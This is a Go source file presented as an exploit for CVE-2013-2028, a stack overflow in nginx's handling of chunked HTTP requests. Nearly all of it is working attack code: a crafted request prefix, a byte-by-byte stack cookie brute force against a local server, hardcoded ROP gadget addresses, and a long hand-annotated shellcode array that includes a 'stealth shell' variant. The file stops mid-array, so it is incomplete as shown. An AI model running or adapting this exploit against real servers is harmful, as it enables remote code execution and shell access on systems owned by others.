// Exploit for CVE-2013-2028

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"time"

	"golang.org/x/sys/unix"
)

var useAxon bool

// constant addresses used for the statically linked version of nginx
const (
	popRDIAddress            = 0x40404d // pop rdi; ret
	popRSIAddress            = 0x406e38 // pop rsi; ret
	popRDXAddress            = 0x41b8fa // pop rdx; xor byte ptr [rax - 0x77], cl; ret
	popRAXAddress            = 0x40b8be // pop rax; ret
	addIndirectRDIALAddress  = 0x462de4 // add byte [rdi], al; mov eax, 0x0; ret
	movIndirectRAXRSIAddress = 0x42afcb // mov qword [rax], rsi; mov eax, 0x0; ret

	mmap64FuncAddress = 0x4029b0 // jmp qword [mmap64@GOT]

	mmap64GOTAddress = 0x67f290

	shellcodeBaseAddress = 0x410000
)

func must[V any](value V, err error) V {
	if err != nil {
		panic(err)
	}
	return value
}

func mustClose(closer io.Closer) {
	if err := closer.Close(); err != nil {
		panic(err)
	}
}

func chunkedPayloadPrefix(hostname string) []byte {
	result := ([]byte)(
		"GET / HTTP/1.1\r\n" +
			"Host: " + hostname + "\r\n" +
			"Accept: */*\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n")
	paddingCount := 1024 - len(result) - 8
	for i := 0; i < paddingCount; i++ {
		result = append(result, 'f')
	}
	result = append(result, ([]byte)("0f0f0f0f")...)
	for i := 0; i < 4096+8; i++ {
		result = append(result, 'A')
	}
	return result
}

func tryPayload(payloadGenerator func(int) []byte, timeout time.Duration) (sent bool, remoteCrashed bool, fd int) {
	fd = must(unix.Socket(unix.AF_INET, unix.SOCK_STREAM, unix.IPPROTO_IP))
	addr := &unix.SockaddrInet4{
		Port: 80,
		Addr: [4]byte{127, 0, 0, 1},
	}
	if err := unix.Connect(fd, addr); err != nil {
		panic(err)
	}
	file := os.NewFile(uintptr(fd), "")
	conn := must(net.FileConn(file))
	// conn := must(net.Dial("tcp", "localhost:80"))
	defer mustClose(conn)
	payload := payloadGenerator(fd)
	n := must(conn.Write(payload))
	if n != len(payload) {
		return
	}
	sent = true
	if timeout > 0 {
		_ = conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		n, err := conn.Read(make([]byte, 10))
		remoteCrashed = n < 10 || err != nil
		// fmt.Printf("n=%d err=%v\n", n, err)
	}
	return
}

func tryPayloadUntilConnect(payloadGenerator func(int) []byte, timeout time.Duration) (remoteCrashed bool, fd int) {
	var sent bool
	for {
		if sent, remoteCrashed, fd = tryPayload(payloadGenerator, timeout); sent {
			return
		}
		unix.Close(fd)
	}
}

func appendUInt64(buf []byte, vals ...uint64) []byte {
	for _, v := range vals {
		buf = append(buf, byte(v), byte(v>>8), byte(v>>16), byte(v>>24), byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56))
	}
	return buf
}

func sendFileLoop(outFd int, inFd int) error {
	for {
		_, err := unix.Sendfile(outFd, inFd, nil, 2 * 1024 * 1024)
		if err != nil {
			return err
		}
	}
}

func readWriteLoop(outFd int, inFd int) error {
	if err := unix.SetNonblock(outFd, false); err != nil {
		return err
	}
	if err := unix.SetNonblock(inFd, false); err != nil {
		return err
	}
	var buf [2048]byte
	for {
		read, err := unix.Read(inFd, buf[:])
		if err != nil {
			return err
		}
		for offset := 0; offset < read; {
			written, err := unix.Write(outFd, buf[offset:read])
			if err != nil {
				return err
			}
			offset += written
		}
	}
}

func main() {
	var cookieString string
	flag.BoolVar(&useAxon, "stealth", false, "use stealth shell payload instead of regular shell")
	flag.StringVar(&cookieString, "stack-cookie", "", "use a known stack cookie")
	flag.Parse()
	// wait for an enter
	payload := chunkedPayloadPrefix("localhost")
	cookie := make([]byte, 0, 8)
	// check payload
	remoteCrashed, fd := tryPayloadUntilConnect(func(fd int) []byte {
		return payload
	}, 100 * time.Millisecond)
	unix.Close(fd)
	if remoteCrashed {
		panic("remote crashed before payload")
	}
	// find stack cookie
	if cookieString == "" {
		fmt.Printf("stack cookie: ")
		for i := 0; i < 8; i++ {
			remoteCrashed = true
			j := 0
			for ; j < 256; j++ {
				candidate := append(cookie, byte(j))
				remoteCrashed, fd = tryPayloadUntilConnect(func(fd int) []byte {
					return append(payload, candidate...)
				}, 100 * time.Millisecond)
				unix.Close(fd)
				// fmt.Printf("i=%d j=%d remoteCrashed=%v candidate=%v\n", i, j, remoteCrashed, candidate)
				if !remoteCrashed {
					cookie = candidate
					break
				}
			}
			if remoteCrashed {
				fmt.Printf("\n")
				panic("could not discover stack cookie")
			}
			var buf [1]byte
			buf[0] = byte(j)
			fmt.Printf("%s", hex.EncodeToString(buf[:]))
		}
		fmt.Printf("\n")
	} else {
		cookie = must(hex.DecodeString(cookieString))
		if len(cookie) != 8 {
			panic("expected a stack cookie length of 8")
		}
	}
	// write the stack cookie
	payload = append(payload, cookie...)
	// padding
	for i := 0; i < 24; i++ {
		payload = append(payload, 'C')
	}
	// wait for an enter
	fmt.Printf("press enter to continue")
	must(fmt.Scanln())
	// send payload
	remoteCrashed, fd = tryPayloadUntilConnect(func(fd int) []byte {
		// painstakingly write out each byte of the shellcode
		var shellcode []byte
		if useAxon {
			shellcode = []byte{
				0x55, // push rbp
				0x41, 0x89, 0xf9, // mov r9d,edi
				0x41, 0x89, 0xf2, // mov r10d,esi
				0x31, 0xff, // xor edi,edi
				0x53, // push rbx
				0xbd, 0x34, 0x00, 0x00, 0x00, // mov ebp,0x34
				0x48, 0x83, 0xec, 0x28, // sub rsp,0x28
				0x48, 0x8d, 0x5c, 0x24, 0x0c, // lea rbx,[rsp+0xc]
				0x48, 0x8d, 0x54, 0x24, 0x08, // lea rdx,[rsp+0x8]
				0xc7, 0x44, 0x24, 0x08, 0x10, 0x00, 0x00, // mov DWORD PTR [rsp+0x8],0x10
				0x00, // 00
				0x48, 0x89, 0xe8, // mov rax,rbp
				0x48, 0x89, 0xde, // mov rsi,rbx
				0x0f, 0x05, // syscall
				0x49, 0x89, 0xc0, // mov r8,rax
				0x48, 0x85, 0xc0, // test rax,rax
				0x75, 0x19, // jne 0x104e
				0x66, 0x83, 0x7c, 0x24, 0x0c, 0x02, // cmp WORD PTR [rsp+0xc],0x2
				0x75, 0x11, // jne 0x104e
				0x44, 0x39, 0x4c, 0x24, 0x10, // cmp DWORD PTR [rsp+0x10],r9d
				0x75, 0x0a, // jne 0x104e
				0x0f, 0xb7, 0x44, 0x24, 0x0e, // movzx eax,WORD PTR [rsp+0xe]
				0x44, 0x39, 0xd0, // cmp eax,r10d
				0x74, 0x05, // je 0x1053
				0x48, 0xff, 0xc7, // inc rdi
				0xeb, 0xca, // jmp 0x101d
				0x41, 0xb9, 0x48, 0x00, 0x00, 0x00, // mov r9d,0x48
				0x41, 0xba, 0x02, 0x00, 0x00, 0x00, // mov r10d,0x2
				0xbe, 0x04, 0x00, 0x00, 0x00, // mov esi,0x4
				0x4c, 0x89, 0xc8, // mov rax,r9
				0x4c, 0x89, 0xd2, // mov rdx,r10
				0x0f, 0x05, // syscall
				0x4c, 0x89, 0xc8, // mov rax,r9
				0x4c, 0x89, 0xd6, // mov rsi,r10
				0x4c, 0x89, 0xc2, // mov rdx,r8
				0x0f, 0x05, // syscall
				0xb8, 0x39, 0x00, 0x00, 0x00, // mov eax,0x39
				0x0f, 0x05, // syscall
				0x85, 0xc0, // test eax,eax
				0x74, 0x0a, // je 0x108c
				0xb8, 0xe7, 0x00, 0x00, 0x00, // mov eax,0xe7
				0x4c, 0x89, 0xc7, // mov rdi,r8
				0x0f, 0x05, // syscall
				0x48, 0x8d, 0x05, 0x57, 0x00, 0x00, 0x00, // lea rax,[rip+0x57] # 0x10ea
				0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, // mov r8d,0x1
				0xc7, 0x05, 0x5d, 0x1f, 0x00, 0x00, 0x00, // mov DWORD PTR [rip+0x1f5d],0x0 # 0x3000
				0x00, 0x00, 0x00, // 00 00 00
				0xba, 0x11, 0x00, 0x00, 0x00, // mov edx,0x11
				0x48, 0x89, 0x44, 0x24, 0x15, // mov QWORD PTR [rsp+0x15],rax
				0x48, 0x8d, 0x05, 0x4c, 0x1f, 0x00, 0x00, // lea rax,[rip+0x1f4c] # 0x3000
				0x48, 0x89, 0xde, // mov rsi,rbx
				0x48, 0x89, 0x44, 0x24, 0x0d, // mov QWORD PTR [rsp+0xd],rax
				0x4c, 0x89, 0xc0, // mov rax,r8
				0xc7, 0x05, 0x77, 0x1f, 0x00, 0x00, 0x00, // mov DWORD PTR [rip+0x1f77],0x0 # 0x3040
				0x00, 0x00, 0x00, // 00 00 00
				0xc6, 0x44, 0x24, 0x0c, 0x00, // mov BYTE PTR [rsp+0xc],0x0
				0x89, 0x3d, 0xac, 0x1f, 0x00, 0x00, // mov DWORD PTR [rip+0x1fac],edi # 0x3080
				0x0f, 0x05, // syscall
				0x48, 0x85, 0xc0, // test rax,rax
				0x79, 0x0a, // jns 0x10e5
				0xb8, 0xe7, 0x00, 0x00, 0x00, // mov eax,0xe7
				0x4c, 0x89, 0xc7, // mov rdi,r8
				0x0f, 0x05, // syscall
				0xe8, 0x00, 0x00, 0x00, 0x00, // call 0x10ea
				0x41, 0x56, // push r14
				0x41, 0x55, // push r13
				0x41, 0x54, // push r12
				0x55, // push rbp
				0x53, // push rbx
				0x4c, 0x8d, 0x9c, 0x24, 0x00, 0x00, 0xf8, // lea r11,[rsp-0x80000]
				0xff, // ff
				0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00, // sub rsp,0x1000
				0x48, 0x83, 0x0c, 0x24, 0x00, // or QWORD PTR [rsp],0x0
				0x4c, 0x39, 0xdc, // cmp rsp,r11
				0x75, 0xef, // jne 0x10fa
				0x48, 0x81, 0xec, 0xf0, 0x00, 0x00, 0x00, // sub rsp,0xf0
				0x48, 0x63, 0x2d, 0x67, 0x1f, 0x00, 0x00, // movsxd rbp,DWORD PTR [rip+0x1f67] # 0x3080
				0x31, 0xc0, // xor eax,eax
				0xba, 0x01, 0x00, 0x00, 0x00, // mov edx,0x1
				0xf0, 0x0f, 0xb1, 0x15, 0xd8, 0x1e, 0x00, // lock cmpxchg DWORD PTR [rip+0x1ed8],edx # 0x3000
				0x00, // 00
				0x85, 0xc0, // test eax,eax
				0x74, 0x42, // je 0x116e
				0xbb, 0x01, 0x00, 0x00, 0x00, // mov ebx,0x1
				0x41, 0xb8, 0x02, 0x00, 0x00, 0x00, // mov r8d,0x2
				0xbe, 0x80, 0x00, 0x00, 0x00, // mov esi,0x80
				0x41, 0xbc, 0xca, 0x00, 0x00, 0x00, // mov r12d,0xca
				0x48, 0x8d, 0x3d, 0xb7, 0x1e, 0x00, 0x00, // lea rdi,[rip+0x1eb7] # 0x3000
				0xba, 0x02, 0x00, 0x00, 0x00, // mov edx,0x2
				0x45, 0x31, 0xc9, // xor r9d,r9d
				0x83, 0xf8, 0x02, // cmp eax,0x2
				0x75, 0x2a, // jne 0x1180
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0x4c, 0x89, 0xe0, // mov rax,r12
				0x0f, 0x05, // syscall
				0x44, 0x89, 0xc8, // mov eax,r9d
				0xf0, 0x44, 0x0f, 0xb1, 0x05, 0x96, 0x1e, // lock cmpxchg DWORD PTR [rip+0x1e96],r8d # 0x3000
				0x00, 0x00, // 00 00
				0x85, 0xc0, // test eax,eax
				0x75, 0xe3, // jne 0x1151
				0x45, 0x31, 0xc9, // xor r9d,r9d
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0x4c, 0x8d, 0x44, 0x24, 0x48, // lea r8,[rsp+0x48]
				0xbb, 0x38, 0x00, 0x00, 0x00, // mov ebx,0x38
				0xeb, 0x16, // jmp 0x1196
				0x89, 0xd8, // mov eax,ebx
				0xf0, 0x44, 0x0f, 0xb1, 0x05, 0x75, 0x1e, // lock cmpxchg DWORD PTR [rip+0x1e75],r8d # 0x3000
				0x00, 0x00, // 00 00
				0x85, 0xc0, // test eax,eax
				0x75, 0xc7, // jne 0x1156
				0xeb, 0xcd, // jmp 0x115e
				0x83, 0xf8, 0xfc, // cmp eax,0xfffffffc
				0x75, 0x1d, // jne 0x11b3
				0x44, 0x89, 0xc8, // mov eax,r9d
				0x48, 0x89, 0xda, // mov rdx,rbx
				0x48, 0x89, 0xef, // mov rdi,rbp
				0x49, 0x8d, 0x34, 0x00, // lea rsi,[r8+rax*1]
				0x48, 0x29, 0xc2, // sub rdx,rax
				0x4c, 0x89, 0xd0, // mov rax,r10
				0x0f, 0x05, // syscall
				0x89, 0xc2, // mov edx,eax
				0x85, 0xc0, // test eax,eax
				0x7f, 0x17, // jg 0x11c8
				0xeb, 0xde, // jmp 0x1191
				0xb8, 0xe7, 0x00, 0x00, 0x00, // mov eax,0xe7
				0x85, 0xd2, // test edx,edx
				0x75, 0x05, // jne 0x11c1
				0x4c, 0x89, 0xd7, // mov rdi,r10
				0x0f, 0x05, // syscall
				0xbf, 0x01, 0x00, 0x00, 0x00, // mov edi,0x1
				0x0f, 0x05, // syscall
				0x41, 0x01, 0xc1, // add r9d,eax
				0x41, 0x83, 0xf9, 0x38, // cmp r9d,0x38
				0x75, 0xc5, // jne 0x1196
				0x48, 0x8d, 0x44, 0x24, 0x0c, // lea rax,[rsp+0xc]
				0x48, 0xc7, 0x84, 0x24, 0x88, 0x00, 0x00, // mov QWORD PTR [rsp+0x88],0xc
				0x00, 0x0c, 0x00, 0x00, 0x00, // 00 0c 00 00 00
				0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, // mov QWORD PTR [rsp+0x80],rax
				0x00, // 00
				0x8b, 0x44, 0x24, 0x48, // mov eax,DWORD PTR [rsp+0x48]
				0x66, 0x3d, 0xff, 0x7f, // cmp ax,0x7fff
				0x74, 0x1b, // je 0x120f
				0x66, 0xff, 0xc0, // inc ax
				0x0f, 0x85, 0xee, 0x00, 0x00, 0x00, // jne 0x12eb
				0x48, 0x8b, 0x5c, 0x24, 0x50, // mov rbx,QWORD PTR [rsp+0x50]
				0x4c, 0x8b, 0x4c, 0x24, 0x58, // mov r9,QWORD PTR [rsp+0x58]
				0x45, 0x31, 0xc0, // xor r8d,r8d
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0xeb, 0x78, // jmp 0x1287
				0xf0, 0xff, 0x0d, 0xea, 0x1d, 0x00, 0x00, // lock dec DWORD PTR [rip+0x1dea] # 0x3000
				0x74, 0x25, // je 0x123d
				0xc7, 0x05, 0xde, 0x1d, 0x00, 0x00, 0x00, // mov DWORD PTR [rip+0x1dde],0x0 # 0x3000
				0x00, 0x00, 0x00, // 00 00 00
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0xb8, 0xca, 0x00, 0x00, 0x00, // mov eax,0xca
				0x48, 0x8d, 0x3d, 0xcf, 0x1d, 0x00, 0x00, // lea rdi,[rip+0x1dcf] # 0x3000
				0xbe, 0x81, 0x00, 0x00, 0x00, // mov esi,0x81
				0xba, 0x01, 0x00, 0x00, 0x00, // mov edx,0x1
				0x0f, 0x05, // syscall
				0x48, 0x8b, 0x44, 0x24, 0x50, // mov rax,QWORD PTR [rsp+0x50]
				0xbb, 0x02, 0x00, 0x00, 0x00, // mov ebx,0x2
				0x48, 0xc7, 0x44, 0x24, 0x0c, 0x00, 0x00, // mov QWORD PTR [rsp+0xc],0x0
				0x00, 0x00, // 00 00
				0x48, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00, // mov QWORD PTR [rsp+0x90],rax
				0x00, // 00
				0x48, 0x8b, 0x44, 0x24, 0x58, // mov rax,QWORD PTR [rsp+0x58]
				0x48, 0x89, 0x84, 0x24, 0x98, 0x00, 0x00, // mov QWORD PTR [rsp+0x98],rax
				0x00, // 00
				0xe9, 0x36, 0x02, 0x00, 0x00, // jmp 0x14a0
				0x4c, 0x89, 0xca, // mov rdx,r9
				0x48, 0x8d, 0x34, 0x03, // lea rsi,[rbx+rax*1]
				0x48, 0x89, 0xef, // mov rdi,rbp
				0x48, 0x29, 0xc2, // sub rdx,rax
				0x4c, 0x89, 0xd0, // mov rax,r10
				0x0f, 0x05, // syscall
				0x89, 0xc2, // mov edx,eax
				0x85, 0xc0, // test eax,eax
				0x7f, 0x24, // jg 0x12a6
				0x83, 0xf8, 0xfc, // cmp eax,0xfffffffc
				0x75, 0x0a, // jne 0x1291
				0x44, 0x89, 0xc0, // mov eax,r8d
				0x4c, 0x39, 0xc8, // cmp rax,r9
				0x75, 0xdb, // jne 0x126a
				0xeb, 0x1a, // jmp 0x12ab
				0xb8, 0xe7, 0x00, 0x00, 0x00, // mov eax,0xe7
				0x85, 0xd2, // test edx,edx
				0x75, 0x05, // jne 0x129f
				0x4c, 0x89, 0xd7, // mov rdi,r10
				0x0f, 0x05, // syscall
				0xbf, 0x01, 0x00, 0x00, 0x00, // mov edi,0x1
				0x0f, 0x05, // syscall
				0x41, 0x01, 0xc0, // add r8d,eax
				0xeb, 0xdc, // jmp 0x1287
				0x83, 0xc8, 0xff, // or eax,0xffffffff
				0xf0, 0x0f, 0xc1, 0x05, 0x4a, 0x1d, 0x00, // lock xadd DWORD PTR [rip+0x1d4a],eax # 0x3000
				0x00, // 00
				0xbb, 0x01, 0x00, 0x00, 0x00, // mov ebx,0x1
				0xff, 0xc8, // dec eax
				0x0f, 0x84, 0xdd, 0x01, 0x00, 0x00, // je 0x14a0
				0xc7, 0x05, 0x33, 0x1d, 0x00, 0x00, 0x00, // mov DWORD PTR [rip+0x1d33],0x0 # 0x3000
				0x00, 0x00, 0x00, // 00 00 00
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0xb8, 0xca, 0x00, 0x00, 0x00, // mov eax,0xca
				0x48, 0x89, 0xda, // mov rdx,rbx
				0x48, 0x8d, 0x3d, 0x21, 0x1d, 0x00, 0x00, // lea rdi,[rip+0x1d21] # 0x3000
				0xbe, 0x81, 0x00, 0x00, 0x00, // mov esi,0x81
				0x0f, 0x05, // syscall
				0xe9, 0xb5, 0x01, 0x00, 0x00, // jmp 0x14a0
				0x0f, 0xb6, 0x7c, 0x24, 0x4a, // movzx edi,BYTE PTR [rsp+0x4a]
				0x44, 0x0f, 0xb6, 0x54, 0x24, 0x4b, // movzx r10d,BYTE PTR [rsp+0x4b]
				0x31, 0xc9, // xor ecx,ecx
				0x31, 0xd2, // xor edx,edx
				0x45, 0x31, 0xc9, // xor r9d,r9d
				0xbb, 0x01, 0x00, 0x00, 0x00, // mov ebx,0x1
				0x4c, 0x8d, 0xa4, 0x24, 0xf0, 0x00, 0x00, // lea r12,[rsp+0xf0]
				0x00, // 00
				0x44, 0x89, 0xd0, // mov eax,r10d
				0xd3, 0xf8, // sar eax,cl
				0x83, 0xe0, 0x01, // and eax,0x1
				0x0f, 0xa3, 0xcf, // bt edi,ecx
				0x73, 0x34, // jae 0x134b
				0x49, 0x8b, 0x74, 0xc8, 0x08, // mov rsi,QWORD PTR [r8+rcx*8+0x8]
				0x4d, 0x8d, 0x1c, 0x14, // lea r11,[r12+rdx*1]
				0x49, 0x01, 0xf1, // add r9,rsi
				0x85, 0xc0, // test eax,eax
				0x74, 0x1a, // je 0x1341
				0x48, 0x89, 0xd8, // mov rax,rbx
				0x48, 0xff, 0xc3, // inc rbx
				0x48, 0xc1, 0xe0, 0x04, // shl rax,0x4
				0x4c, 0x89, 0x9c, 0x04, 0x80, 0x00, 0x00, // mov QWORD PTR [rsp+rax*1+0x80],r11
				0x00, // 00
				0x48, 0x89, 0xb4, 0x04, 0x88, 0x00, 0x00, // mov QWORD PTR [rsp+rax*1+0x88],rsi
				0x00, // 00
				0x4c, 0x89, 0x5c, 0xcc, 0x18, // mov QWORD PTR [rsp+rcx*8+0x18],r11
				0x48, 0x01, 0xf2, // add rdx,rsi
				0xeb, 0x0e, // jmp 0x1359
				0x85, 0xc0, // test eax,eax
				0x75, 0x0a, // jne 0x1359
				0x49, 0x8b, 0x44, 0xc8, 0x08, // mov rax,QWORD PTR [r8+rcx*8+0x8]
				0x48, 0x89, 0x44, 0xcc, 0x18, // mov QWORD PTR [rsp+rcx*8+0x18],rax
				0x48, 0xff, 0xc1, // inc rcx
				0x48, 0x83, 0xf9, 0x06, // cmp rcx,0x6
				0x75, 0xa8, // jne 0x130a
				0x31, 0xc0, // xor eax,eax
				0x4c, 0x8d, 0xa4, 0x24, 0xf0, 0x00, 0x00, // lea r12,[rsp+0xf0]
				0x00, // 00
				0x0f, 0xa3, 0xc7, // bt edi,eax
				0x72, 0x31, // jb 0x13a2
				0x41, 0x0f, 0xa3, 0xc2, // bt r10d,eax
				0x73, 0x2b, // jae 0x13a2
				0x49, 0x8b, 0x4c, 0xc0, 0x08, // mov rcx,QWORD PTR [r8+rax*8+0x8]
				0x49, 0x89, 0xdb, // mov r11,rbx
				0x49, 0x8d, 0x34, 0x14, // lea rsi,[r12+rdx*1]
				0x48, 0xff, 0xc3, // inc rbx
				0x49, 0xc1, 0xe3, 0x04, // shl r11,0x4
				0x48, 0x89, 0x74, 0xc4, 0x18, // mov QWORD PTR [rsp+rax*8+0x18],rsi
				0x4a, 0x89, 0xb4, 0x1c, 0x80, 0x00, 0x00, // mov QWORD PTR [rsp+r11*1+0x80],rsi
				0x00, // 00
				0x48, 0x01, 0xca, // add rdx,rcx
				0x4a, 0x89, 0x8c, 0x1c, 0x88, 0x00, 0x00, // mov QWORD PTR [rsp+r11*1+0x88],rcx
				0x00, // 00
				0x48, 0xff, 0xc0, // inc rax
				0x48, 0x83, 0xf8, 0x06, // cmp rax,0x6
				0x75, 0xc1, // jne 0x136c
				0x45, 0x31, 0xc0, // xor r8d,r8d
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0x4c, 0x8d, 0xa4, 0x24, 0xf0, 0x00, 0x00, // lea r12,[rsp+0xf0]
				0x00, // 00
				0x41, 0xbd, 0x00, 0x00, 0x08, 0x00, // mov r13d,0x80000
				0x44, 0x89, 0xc0, // mov eax,r8d
				0x4c, 0x39, 0xc8, // cmp rax,r9
				0x74, 0x37, // je 0x13fe
				0x4c, 0x89, 0xea, // mov rdx,r13
				0x49, 0x8d, 0x34, 0x04, // lea rsi,[r12+rax*1]
				0x48, 0x89, 0xef, // mov rdi,rbp
				0x48, 0x29, 0xc2, // sub rdx,rax
				0x4c, 0x89, 0xd0, // mov rax,r10
				0x0f, 0x05, // syscall
				0x89, 0xc2, // mov edx,eax
				0x85, 0xc0, // test eax,eax
				0x7f, 0x1a, // jg 0x13f9
				0x83, 0xf8, 0xfc, // cmp eax,0xfffffffc
				0x74, 0xdb, // je 0x13bf
				0xb8, 0xe7, 0x00, 0x00, 0x00, // mov eax,0xe7
				0x85, 0xd2, // test edx,edx
				0x75, 0x05, // jne 0x13f2
				0x4c, 0x89, 0xd7, // mov rdi,r10
				0x0f, 0x05, // syscall
				0xbf, 0x01, 0x00, 0x00, 0x00, // mov edi,0x1
				0x0f, 0x05, // syscall
				0x41, 0x01, 0xc0, // add r8d,eax
				0xeb, 0xc1, // jmp 0x13bf
				0xf0, 0xff, 0x0d, 0xfb, 0x1b, 0x00, 0x00, // lock dec DWORD PTR [rip+0x1bfb] # 0x3000
				0x74, 0x25, // je 0x142c
				0xc7, 0x05, 0xef, 0x1b, 0x00, 0x00, 0x00, // mov DWORD PTR [rip+0x1bef],0x0 # 0x3000
				0x00, 0x00, 0x00, // 00 00 00
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0xb8, 0xca, 0x00, 0x00, 0x00, // mov eax,0xca
				0x48, 0x8d, 0x3d, 0xe0, 0x1b, 0x00, 0x00, // lea rdi,[rip+0x1be0] # 0x3000
				0xbe, 0x81, 0x00, 0x00, 0x00, // mov esi,0x81
				0xba, 0x01, 0x00, 0x00, 0x00, // mov edx,0x1
				0x0f, 0x05, // syscall
				0x0f, 0xb7, 0x44, 0x24, 0x48, // movzx eax,WORD PTR [rsp+0x48]
				0x4c, 0x8b, 0x4c, 0x24, 0x40, // mov r9,QWORD PTR [rsp+0x40]
				0x48, 0x8b, 0x4c, 0x24, 0x38, // mov rcx,QWORD PTR [rsp+0x38]
				0x4c, 0x8b, 0x54, 0x24, 0x30, // mov r10,QWORD PTR [rsp+0x30]
				0x80, 0xe4, 0x7f, // and ah,0x7f
				0x4c, 0x8b, 0x74, 0x24, 0x28, // mov r14,QWORD PTR [rsp+0x28]
				0x4c, 0x8b, 0x6c, 0x24, 0x20, // mov r13,QWORD PTR [rsp+0x20]
				0x4c, 0x8b, 0x64, 0x24, 0x18, // mov r12,QWORD PTR [rsp+0x18]
				0x3d, 0xfe, 0x7f, 0x00, 0x00, // cmp eax,0x7ffe
				0x75, 0x11, // jne 0x146a
				0x4d, 0x89, 0xc8, // mov r8,r9
				0x4c, 0x89, 0xd2, // mov rdx,r10
				0x4c, 0x89, 0xf6, // mov rsi,r14
				0x4c, 0x89, 0xef, // mov rdi,r13
				0x41, 0xff, 0xd4, // call r12
				0xeb, 0x31, // jmp 0x149b
				0x83, 0xf8, 0x38, // cmp eax,0x38
				0x75, 0x1c, // jne 0x148b
				0x49, 0x89, 0xc8, // mov r8,rcx
				0x4c, 0x89, 0xe7, // mov rdi,r12
				0x4c, 0x89, 0xee, // mov rsi,r13
				0x4c, 0x89, 0xf2, // mov rdx,r14
				0x0f, 0x05, // syscall
				0x85, 0xc0, // test eax,eax
				0x75, 0x08, // jne 0x1489
				0x31, 0xed, // xor ebp,ebp
				0x4c, 0x89, 0xc7, // mov rdi,r8
				0x41, 0xff, 0xe1, // jmp r9
				0xeb, 0x10, // jmp 0x149b
				0x48, 0x98, // cdqe
				0x49, 0x89, 0xc8, // mov r8,rcx
				0x4c, 0x89, 0xe7, // mov rdi,r12
				0x4c, 0x89, 0xee, // mov rsi,r13
				0x4c, 0x89, 0xf2, // mov rdx,r14
				0x0f, 0x05, // syscall
				0x48, 0x89, 0x44, 0x24, 0x0c, // mov QWORD PTR [rsp+0xc],rax
				0x66, 0x83, 0x7c, 0x24, 0x48, 0x00, // cmp WORD PTR [rsp+0x48],0x0
				0x0f, 0x88, 0x6d, 0xfc, 0xff, 0xff, // js 0x1119
				0x8b, 0x44, 0x24, 0x4c, // mov eax,DWORD PTR [rsp+0x4c]
				0xba, 0x01, 0x00, 0x00, 0x00, // mov edx,0x1
				0x89, 0x44, 0x24, 0x14, // mov DWORD PTR [rsp+0x14],eax
				0x31, 0xc0, // xor eax,eax
				0xf0, 0x0f, 0xb1, 0x15, 0x7d, 0x1b, 0x00, // lock cmpxchg DWORD PTR [rip+0x1b7d],edx # 0x3040
				0x00, // 00
				0x85, 0xc0, // test eax,eax
				0x74, 0x43, // je 0x150a
				0x41, 0xbc, 0x01, 0x00, 0x00, 0x00, // mov r12d,0x1
				0x41, 0xb8, 0x02, 0x00, 0x00, 0x00, // mov r8d,0x2
				0xbe, 0x80, 0x00, 0x00, 0x00, // mov esi,0x80
				0x41, 0xbd, 0xca, 0x00, 0x00, 0x00, // mov r13d,0xca
				0x48, 0x8d, 0x3d, 0x5b, 0x1b, 0x00, 0x00, // lea rdi,[rip+0x1b5b] # 0x3040
				0xba, 0x02, 0x00, 0x00, 0x00, // mov edx,0x2
				0x45, 0x31, 0xc9, // xor r9d,r9d
				0x83, 0xf8, 0x02, // cmp eax,0x2
				0x75, 0x33, // jne 0x1525
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0x4c, 0x89, 0xe8, // mov rax,r13
				0x0f, 0x05, // syscall
				0x44, 0x89, 0xc8, // mov eax,r9d
				0xf0, 0x44, 0x0f, 0xb1, 0x05, 0x3a, 0x1b, // lock cmpxchg DWORD PTR [rip+0x1b3a],r8d # 0x3040
				0x00, 0x00, // 00 00
				0x85, 0xc0, // test eax,eax
				0x75, 0xe3, // jne 0x14ed
				0x45, 0x31, 0xc0, // xor r8d,r8d
				0x4c, 0x8d, 0x8c, 0x24, 0x80, 0x00, 0x00, // lea r9,[rsp+0x80]
				0x00, // 00
				0x41, 0xbc, 0x14, 0x00, 0x00, 0x00, // mov r12d,0x14
				0x4c, 0x8d, 0xac, 0x24, 0x88, 0x00, 0x00, // lea r13,[rsp+0x88]
				0x00, // 00
				0xeb, 0x18, // jmp 0x153d
				0x44, 0x89, 0xe0, // mov eax,r12d
				0xf0, 0x44, 0x0f, 0xb1, 0x05, 0x0f, 0x1b, // lock cmpxchg DWORD PTR [rip+0x1b0f],r8d # 0x3040
				0x00, 0x00, // 00 00
				0x85, 0xc0, // test eax,eax
				0x75, 0xbd, // jne 0x14f2
				0xeb, 0xc3, // jmp 0x14fa
				0x48, 0x83, 0xf8, 0xfc, // cmp rax,0xfffffffffffffffc
				0x75, 0x2a, // jne 0x1567
				0x89, 0xda, // mov edx,ebx
				0x4c, 0x89, 0xc6, // mov rsi,r8
				0x45, 0x31, 0xd2, // xor r10d,r10d
				0x4c, 0x89, 0xe0, // mov rax,r12
				0x44, 0x29, 0xc2, // sub edx,r8d
				0x48, 0xc1, 0xe6, 0x04, // shl rsi,0x4
				0x48, 0x89, 0xef, // mov rdi,rbp
				0x48, 0x63, 0xd2, // movsxd rdx,edx
				0x4c, 0x01, 0xce, // add rsi,r9
				0x0f, 0x05, // syscall
				0x48, 0x89, 0xc7, // mov rdi,rax
				0x48, 0x89, 0xc2, // mov rdx,rax
				0x48, 0x85, 0xc0, // test rax,rax
				0x7e, 0xd2, // jle 0x1537
				0xeb, 0x1e, // jmp 0x1585
				0xb8, 0xe7, 0x00, 0x00, 0x00, // mov eax,0xe7
				0x48, 0x85, 0xff, // test rdi,rdi
				0x75, 0x02, // jne 0x1573
				0x0f, 0x05, // syscall
				0xbf, 0x01, 0x00, 0x00, 0x00, // mov edi,0x1
				0x0f, 0x05, // syscall
				0x49, 0xff, 0xc0, // inc r8
				0x48, 0x29, 0xc2, // sub rdx,rax
